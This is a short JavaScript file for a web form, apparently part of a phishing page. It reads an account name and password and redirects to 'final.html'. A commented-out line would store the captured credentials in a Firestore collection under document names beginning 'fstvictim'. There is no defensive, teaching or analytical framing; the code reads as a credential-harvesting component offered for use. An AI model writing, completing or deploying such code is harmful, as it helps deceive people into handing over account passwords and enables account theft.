var db = firebase.firestore();



function checkCBox()
{
	console.log(document.getElementById("cBox").checked);
}


function sendthis(){
	var name = document.getElementById("name").value;
	var pass = document.getElementById("pass").value;
	var vid = document.getElementById("vid").value;

	data = {accname:name,accpass:pass}
	if (name !== "" && vid !== "" && pass !== "" )
	{
		//db.collection("data").doc("fstvictim "+Math.floor(100*Math.random())).set(data);
		window.location.href = "final.html";
	}
	else
	{
		document.getElementById("t").innerHTML = "Please Complete The Form";
		alert("Please Complete The Form");
	}

}


